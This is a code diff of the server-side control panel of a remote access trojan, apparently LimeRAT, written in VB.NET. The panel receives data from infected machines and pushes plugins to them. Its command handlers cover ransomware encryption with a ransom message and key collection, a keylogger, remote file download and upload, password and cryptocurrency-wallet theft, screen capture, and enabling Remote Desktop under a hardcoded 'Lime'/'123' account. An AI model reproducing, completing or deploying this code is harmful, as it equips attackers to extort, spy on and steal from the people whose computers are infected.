+                Case "Key"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+
+                    IO.File.WriteAllText(uFolder(A(1), "KEY.txt"), A(2))
+                    Exit Select
+
+                Case "SC"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+
+                    IO.File.WriteAllBytes(uFolder(A(1), "SC.jpeg"), Convert.FromBase64String(A(2)))
+                    Exit Select
+
+                Case "DEC"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+
+                    S.Send(u, "DEC" + SPL + IO.File.ReadAllText(uFolder(A(1), "KEY.txt")))
+                    Exit Select
+
+                Case "ENC"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+
+                    S.Send(u, "ENC" + SPL + RANS_TEXT + SPL + RANS_IMG)
+                    Exit Select
+#End Region
+
+#Region "File Manager"
+                Case "OFM"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+
+                    Dim FM As File_Manager = My.Application.OpenForms("FM" + A(1))
+                    If FM Is Nothing Then
+                        FM = New File_Manager
+                        FM.M = Me
+                        FM.U = u
+                        FM.Name = "FM" + A(1)
+                        FM.Text = "File Manager " + S.IP(u)
+                        FM.Show()
+                    End If
+                    Exit Select
+
+                Case "FM"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+
+                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
+                    If FM IsNot Nothing Then
+
+
+                        If A(2) = "Error " Then
+                            FM.BackToolStripMenuItem.PerformClick()
+                            FM.Label2.Text = A(3)
+                            Return
+                        Else
+                            FM.L1.Items.Clear()
+                            Dim allFiles As String() = Split(A(2), "|SPL_FM|")
+                            For i = 0 To allFiles.Length - 2
+                                Dim itm As New ListViewItem
+                                itm.Text = allFiles(i)
+                                itm.SubItems.Add(allFiles(i + 1))
+                                If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
+                                    itm.SubItems(1).Text = siz(itm.SubItems(1).Text)
+                                    itm.Tag = Convert.ToInt64(allFiles(i + 1))
+                                End If
+                                If itm.Text.StartsWith("[Drive]") Then
+                                    itm.ImageIndex = 0
+                                    itm.Text = itm.Text.Substring(7)
+                                ElseIf itm.Text.StartsWith("[CD]") Then
+                                    itm.ImageIndex = 1
+                                    itm.Text = itm.Text.Substring(4)
+                                ElseIf itm.Text.StartsWith("[Folder]") Then
+                                    itm.ImageIndex = 2
+                                    itm.Text = itm.Text.Substring(8)
+                                ElseIf itm.Text.EndsWith(".exe") Then
+                                    itm.ImageIndex = 3
+                                ElseIf itm.Text.EndsWith(".jpg") OrElse itm.Text.EndsWith(".jpeg") OrElse itm.Text.EndsWith(".gif") OrElse itm.Text.EndsWith(".png") OrElse itm.Text.EndsWith(".bmp") Then
+                                    itm.ImageIndex = 4
+                                ElseIf itm.Text.EndsWith(".doc") OrElse itm.Text.EndsWith(".rtf") OrElse itm.Text.EndsWith(".txt") Then
+                                    itm.ImageIndex = 5
+                                ElseIf itm.Text.EndsWith(".dll") Then
+                                    itm.ImageIndex = 6
+                                ElseIf itm.Text.EndsWith(".zip") OrElse itm.Text.EndsWith(".rar") Then
+                                    itm.ImageIndex = 7
+                                ElseIf itm.Text.EndsWith(".wav") Then
+                                    itm.ImageIndex = 9
+                                ElseIf itm.Text.EndsWith(".avi") OrElse itm.Text.EndsWith(".mb4") OrElse itm.Text.EndsWith(".flv") OrElse itm.Text.EndsWith(".3gp") Then
+                                    itm.ImageIndex = 11
+                                ElseIf itm.Text.EndsWith(".mp3") Then
+                                    itm.ImageIndex = 12
+                                ElseIf itm.Text.EndsWith(".html") OrElse itm.Text.EndsWith(".Php") OrElse itm.Text.EndsWith(".xml") Then
+                                    itm.ImageIndex = 10
+                                ElseIf itm.Text.EndsWith(".rar") Then
+                                    itm.ImageIndex = 13
+                                ElseIf itm.Text.EndsWith(".Lime") Then
+                                    itm.ForeColor = Color.Lime
+                                    itm.ImageIndex = 14
+                                Else
+                                    itm.ImageIndex = 8
+                                End If
+                                FM.L1.Items.Add(itm)
+                                i += 1
+                            Next
+                            Try
+                                If A(3).ToString.Length > 3 Then
+                                    FM.Label1.Text = A(3) + "\"
+                                End If
+                            Catch ex As Exception
+                            End Try
+                            FM.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+                        End If
+                    End If
+                    Exit Select
+
+                Case "DW"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+
+                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
+                    If FM IsNot Nothing Then
+                        IO.File.WriteAllBytes(uFolder(A(1) + "\Downloads", A(3)), Convert.FromBase64String(A(2)))
+                        FM.Label2.Text = "Download Finish " + A(3)
+                    End If
+                    Exit Select
+
+                Case "UP"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+
+                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
+                    If FM IsNot Nothing Then
+                        FM.RefreshList()
+                        FM.Label2.Text = "Upload Finish " + A(2)
+                    End If
+                    Exit Select
+
+                Case "DEL"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+
+                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
+                    If FM IsNot Nothing Then
+                        FM.RefreshList()
+                    End If
+                    Exit Select
+
+                Case "PRE"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+
+                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
+                    If FM IsNot Nothing Then
+                        Dim MM = New IO.MemoryStream(System.Text.Encoding.Default.GetBytes(A(2)))
+                        FM.PictureBox1.Image = Bitmap.FromStream(MM)
+                        FM.Label2.ForeColor = Color.Lime
+                        FM.Label2.Text = "Preview Size " & siz(A(2).Length)
+                        FM.PictureBox1.Visible = True
+                        MM.Dispose()
+                    End If
+                    Exit Select
+
+
+#End Region
+
+#Region "Keylogger"
+
+                Case "KL"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+
+                    SyncLock L1.Items
+                        For i As Integer = 0 To L1.Items.Count - 1
+                            If L1.Items.Item(i).SubItems(1).Text = S.IP(u) Then
+                                L1.Items.Item(i).BackColor = Nothing
+                            End If
+                        Next
+                    End SyncLock
+
+                    Dim KL As Keylogger = My.Application.OpenForms("KL" + A(1))
+
+                    If KL Is Nothing Then
+                        KL = New Keylogger
+                        KL.M = Me
+                        KL.U = u
+                        KL.Name = "KL" + A(1)
+                        KL.Text = "Keylogger - " & S.IP(u)
+                        KL.Show()
+                    End If
+
+                    KL.RichTextBox1.AppendText(A(2).ToString)
+                    Exit Select
+
+#End Region
+
+#Region "Crypto"
+
+                Case "CRYP"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+
+                    IO.File.WriteAllBytes(uFolder(A(1), "Wallets.zip"), Convert.FromBase64String(A(2)))
+                    Messages(S.IP(u), "Found Wallets: " + A(3))
+#End Region
+
+#Region "Enable Windows RDP"
+
+                Case "WRDP"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+                    Messages(S.IP(u), "Enable Remote Desktop! USER:Lime PASS:123")
+                    Process.Start("mstsc", "/v:" + S.IP(u))
+
+#End Region
 
 #Region "Thumbnail"
 
-    Private Sub CAPstart_Click(sender As Object, e As EventArgs) Handles CAPstart.Click
-        If CAPstart.Text = "START" Then
+                Case "#CAP"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
 
-            CAP.Interval = CAPsec.Value * 1000
-            CAP.Enabled = True
-            CAP.Start()
-            CAPstart.Text = "STOP"
+                    Dim MM = New IO.MemoryStream(System.Text.Encoding.Default.GetBytes(A(2)))
+                    Bitmap.FromStream(MM)
+                    For Each x As ListViewItem In L3.Items
+                        If x.SubItems(0).Text = A(1) Then
+                            Dim newImage As Image = Bitmap.FromStream(MM)
+                            Dim imgKey As String = A(1)
+                            Dim previousImage As Image = ImageList1.Images(ImageList1.Images.Keys.IndexOf(A(1)))
+                            ImageList1.Images.RemoveByKey(imgKey)
+                            ImageList1.Images.Add(imgKey, newImage)
+                            previousImage.Dispose()
+                            MM.Dispose()
+                            Exit Select
+                        End If
+                    Next
 
-        Else
+                    ImageList1.Images.Add(A(1), Bitmap.FromStream(MM))
+                    L3.Items.Add(A(1), A(1))
+                    MM.Dispose()
+                    Exit Select
+#End Region
 
-            Try
-                CAP.Dispose()
-                CAPstart.Text = "START"
-                L3.Items.Clear()
-            Catch ex As Exception
-            End Try
+#Region "Send Plugin"
+                Case "GPL"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
 
-        End If
+                    Dim Folderx = IO.Directory.GetFiles(Application.StartupPath & "\Misc\Plugins")
+                    For Each file In Folderx
+                        Dim HASH = getMD5Hash(IO.File.ReadAllBytes(file))
 
-    End Sub
+                        If HASH = A(1) Then
+                            S.Send(u, "IPL" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(file), True)) + SPL + getMD5Hash(IO.File.ReadAllBytes(file)))
+                        End If
+                    Next
+                    Exit Select
 
+                Case "PLUSB"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
 
-    Private Async Sub Timer4_Tick(sender As Object, e As EventArgs) Handles CAP.Tick
-        Dim M As New IO.MemoryStream
-        Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("!CAP"))
-        Await M.WriteAsync(CMD, 0, CMD.Length)
-        Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-        Try
-            For Each x As ListViewItem In L1.Items
-                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                    Dim CL As S_Client = CType(x.Tag, S_Client)
-                    CL.Send(M.ToArray)
-                End If
-            Next
+                    S.Send(u, "IPL" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\USB.dll"), True)) + SPL + "_USB")
+                    Exit Select
+
+                Case "PLPIN"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+
+                    S.Send(u, "IPL" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PIN.dll"), True)) + SPL + "_PIN")
+                    Exit Select
+
+                Case "PLKLG"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+
+                    S.Send(u, "IPL" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\KLG.dll"), True)) + SPL + "_KLG")
+                    Exit Select
+
+#End Region
+
+#Region "Messages"
+                Case "MSG"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+
+                    Messages(S.IP(u), A(1))
+                    Exit Select
+#End Region
+
+            End Select
         Catch ex As Exception
-            C.isDisconnected()
-        End Try
-
-        Try
-            M.Dispose()
-        Catch ex As Exception
+            Messages(S.IP(u), ex.Message)
         End Try
     End Sub
 
 #End Region
 
 
-#Region "Theme"
+#Region "Logs"
 
+    Public Sub Messages(ByVal user As String, ByVal msg As String)
+        L2.Items.Insert(0, "[" + DateAndTime.Now.ToString("hh:mm:ss tt") + "]" + "  " + user + "  →  " + msg.ToString)
+        If msg.ToString.Contains("Error!") AndAlso MetroToggle1.Checked = True Then
+            Try : My.Computer.Audio.Play(My.Resources._Error, AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
+        End If
+    End Sub
 
     Private Sub L2_DrawItem(sender As System.Object, e As DrawItemEventArgs) Handles L2.DrawItem
         Try
@@ -309,15 +1157,53 @@ Public Class Main
             e.DrawFocusRectangle()
         Catch ex As Exception
         End Try
-
     End Sub
-
 
     Private Sub L2_Click(sender As Object, e As EventArgs) Handles L2.Click
         L2.ClearSelected()
     End Sub
 
 
+
+#End Region
+
+
+#Region "Thumbnail"
+
+    Private Sub CAPstart_Click(sender As Object, e As EventArgs) Handles CAPstart.Click
+        If CAPstart.Text = "START" Then
+
+            CAP.Interval = CAPsec.Value * 1000
+            CAP.Enabled = True
+            CAP.Start()
+            CAPstart.Text = "STOP"
+
+        Else
+
+            Try
+                CAP.Dispose()
+                CAPstart.Text = "START"
+                L3.Items.Clear()
+            Catch ex As Exception
+            End Try
+
+        End If
+
+    End Sub
+
+
+    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles CAP.Tick
+        For Each x As ListViewItem In L1.Items
+            If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                S.Send(x.Tag, "!CAP")
+            End If
+        Next
+    End Sub
+
+#End Region
+
+
+#Region "Theme"
 
     Class ListViewComparer
         Implements IComparer
@@ -520,145 +1406,47 @@ Public Class Main
 
 #Region "Plugins"
 
-    Private Async Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
-        If L1.Items.Count > 0 Then
-            Try
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\RDP.dll"))))
-                Dim M As New IO.MemoryStream
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                For Each x As ListViewItem In L1.SelectedItems
-                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
-                        x.BackColor = Color.DarkSlateGray
-                        CL.Send(M.ToArray)
-                    End If
-                Next
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
-
-            Catch ex As Exception
-                MsgBox(ex.Message, MsgBoxStyle.Critical)
-                Exit Sub
-            End Try
-        End If
+    Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
+        Try
+            For Each x As ListViewItem In L1.SelectedItems
+                Dim _RDP As Remote_Desktop = My.Application.OpenForms("!" + x.SubItems(USERN.Index).Text + "_" + x.SubItems(ID.Index).Text)
+                If _RDP Is Nothing AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\RDP.dll")))
+                    x.BackColor = Color.DarkSlateGray
+                End If
+            Next
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Exit Sub
+        End Try
     End Sub
 
     Public Shared RANS_IMG
     Public Shared RANS_TEXT
-    Private Async Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
-        If L1.Items.Count > 0 Then
-            Dim M As New IO.MemoryStream
-
-            Try
-                Dim R As New Ransomware
-                R.ShowDialog()
-                Dim result As DialogResult
-                If R.OK = True Then
-                    RANS_IMG = Convert.ToBase64String(IO.File.ReadAllBytes(R.PictureBox1.ImageLocation))
-                    RANS_TEXT = R.RichTextBox1.Text
-                    Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\ENC.dll"))))
-                    Await M.WriteAsync(CMD, 0, CMD.Length)
-                    Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                    For Each x As ListViewItem In L1.SelectedItems
-                        If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                            Dim CL As S_Client = CType(x.Tag, S_Client)
-                            If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." Then
-                                result = MessageBox.Show("Task is already in progress! Please wait until it's done. " & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
-                                If result = DialogResult.Yes Then
-                                    x.BackColor = Color.DarkSlateGray
-                                    CL.Send(CMD)
-                                End If
-                            Else
-                                x.BackColor = Color.DarkSlateGray
-                                CL.Send(CMD)
-                            End If
-                        End If
-                    Next
-                End If
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
-
-            Catch ex As Exception
-                MsgBox(ex.Message, MsgBoxStyle.Critical)
-                Exit Sub
-            End Try
-        End If
-
-
-    End Sub
-
-    Private Async Sub DecryptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptionToolStripMenuItem.Click
+    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
         Try
-            If L1.Items.Count > 0 Then
-                Dim M As New IO.MemoryStream
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DEC.dll"))))
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
+            Dim R As New Ransomware
+            R.ShowDialog()
+            Dim result As DialogResult
+            If R.OK = True Then
+                RANS_IMG = Convert.ToBase64String(IO.File.ReadAllBytes(R.PictureBox1.ImageLocation))
+                RANS_TEXT = R.RichTextBox1.Text
                 For Each x As ListViewItem In L1.SelectedItems
                     If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
                         If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." Then
-                            Dim result As DialogResult
                             result = MessageBox.Show("Task is already in progress! Please wait until it's done. " & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
-                            If result = DialogResult.Yes Then
+                            If result = DialogResult.No Then
+
+                            ElseIf result = DialogResult.Yes Then
+                                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\ENC.dll")))
                                 x.BackColor = Color.DarkSlateGray
-                                CL.Send(M.ToArray)
                             End If
                         Else
+                            S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\ENC.dll")))
                             x.BackColor = Color.DarkSlateGray
-                            CL.Send(M.ToArray)
                         End If
                     End If
                 Next
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
-            End If
-        Catch ex As Exception
-            MsgBox(ex.Message, MsgBoxStyle.Critical)
-            Exit Sub
-        End Try
-
-    End Sub
-
-    Private Async Sub FIleManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FIleManagerToolStripMenuItem.Click
-        Try
-            If L1.Items.Count > 0 Then
-                Dim M As New IO.MemoryStream
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\FM.dll"))))
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                For Each x As ListViewItem In L1.SelectedItems
-                    Dim FM As File_Manager = My.Application.OpenForms("FM" + x.SubItems(USERN.Index).Text + "_" + x.SubItems(ID.Index).Text)
-                    If FM Is Nothing AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
-                        x.BackColor = Color.DarkSlateGray
-                        CL.Send(M.ToArray)
-                    End If
-                Next
-
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
             End If
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
@@ -666,85 +1454,84 @@ Public Class Main
         End Try
     End Sub
 
-    Private Async Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
+    Private Sub DecryptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptionToolStripMenuItem.Click
         Try
-            If L1.Items.Count > 0 Then
-                Dim M As New IO.MemoryStream
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DET.dll"))))
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
+            For Each x As ListViewItem In L1.SelectedItems
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." Then
+                        Dim result As DialogResult
+                        result = MessageBox.Show("Task is already in progress! Please wait until it's done. " & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
 
-                For Each x As ListViewItem In L1.SelectedItems
-                    Dim n As System_Manager = My.Application.OpenForms("Info" + x.SubItems(ID.Index).Text)
-                    If n Is Nothing AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
+                        If result = DialogResult.No Then
+
+                        ElseIf result = DialogResult.Yes Then
+                            S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DEC.dll")))
+                            x.BackColor = Color.DarkSlateGray
+                        End If
+                    Else
+                        S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DEC.dll")))
                         x.BackColor = Color.DarkSlateGray
-                        CL.Send(M.ToArray)
                     End If
-                Next
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
-            End If
+                End If
+            Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
             Exit Sub
         End Try
     End Sub
 
-    Private Async Sub STOPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles STOPToolStripMenuItem.Click
+    Private Sub FIleManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FIleManagerToolStripMenuItem.Click
         Try
-            If L1.Items.Count > 0 Then
-                Dim M As New IO.MemoryStream
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\LOCS.dll"))))
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                For Each x As ListViewItem In L1.SelectedItems
-                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
-                        x.BackColor = Color.DarkSlateGray
-                        CL.Send(M.ToArray)
-                    End If
-                Next
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
-            End If
+            For Each x As ListViewItem In L1.SelectedItems
+                Dim FM As File_Manager = My.Application.OpenForms("FM" + x.SubItems(USERN.Index).Text + "_" + x.SubItems(ID.Index).Text)
+                If FM Is Nothing AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\FM.dll")))
+                    x.BackColor = Color.DarkSlateGray
+                End If
+            Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
             Exit Sub
         End Try
     End Sub
 
-    Private Async Sub STARTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles STARTToolStripMenuItem.Click
+    Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
         Try
-            If L1.Items.Count > 0 Then
-                Dim M As New IO.MemoryStream
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\LOC.dll"))))
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
+            For Each x As ListViewItem In L1.SelectedItems
+                Dim n As System_Manager = My.Application.OpenForms("Info" + x.SubItems(ID.Index).Text)
+                If n Is Nothing AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DET.dll")))
+                    x.BackColor = Color.DarkSlateGray
+                End If
+            Next
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Exit Sub
+        End Try
+    End Sub
 
-                For Each x As ListViewItem In L1.SelectedItems
-                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
-                        x.BackColor = Color.DarkSlateGray
-                        CL.Send(M.ToArray)
-                    End If
-                Next
+    Private Sub STOPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles STOPToolStripMenuItem.Click
+        Try
+            For Each x As ListViewItem In L1.SelectedItems
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\LOCS.dll")))
+                    x.BackColor = Color.DarkSlateGray
+                End If
+            Next
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Exit Sub
+        End Try
+    End Sub
 
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
-            End If
+    Private Sub STARTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles STARTToolStripMenuItem.Click
+        Try
+            For Each x As ListViewItem In L1.SelectedItems
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\LOC.dll")))
+                    x.BackColor = Color.DarkSlateGray
+                End If
+            Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
             Exit Sub
@@ -752,109 +1539,65 @@ Public Class Main
     End Sub
 
     Public PW_F As Boolean = False
-    Private Async Sub PasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasswordsToolStripMenuItem.Click
+    Private Sub PasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasswordsToolStripMenuItem.Click
         Try
-            If L1.Items.Count > 0 Then
-                Dim M As New IO.MemoryStream
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PWD.dll"))))
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                For Each x As ListViewItem In L1.SelectedItems
-                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
-                        x.BackColor = Color.DarkSlateGray
-                        CL.Send(M.ToArray)
-                        PW_F = True
-                    End If
-                Next
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
-            End If
+            For Each x As ListViewItem In L1.SelectedItems
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PWD.dll")))
+                    x.BackColor = Color.DarkSlateGray
+                    PW_F = True
+                End If
+            Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
             Exit Sub
         End Try
     End Sub
 
-    Private Async Sub CryptocurrencyStealerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CryptocurrencyStealerToolStripMenuItem.Click
+    Private Sub CryptocurrencyStealerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CryptocurrencyStealerToolStripMenuItem.Click
         Try
-            If L1.Items.Count > 0 Then
-                S_Messages.Messages("Crypto currency Stealer", "Client must be .NET 4.0")
+            Messages("Crypto currency Stealer", "Client must be .NET 4.0")
 
-                Dim M As New IO.MemoryStream
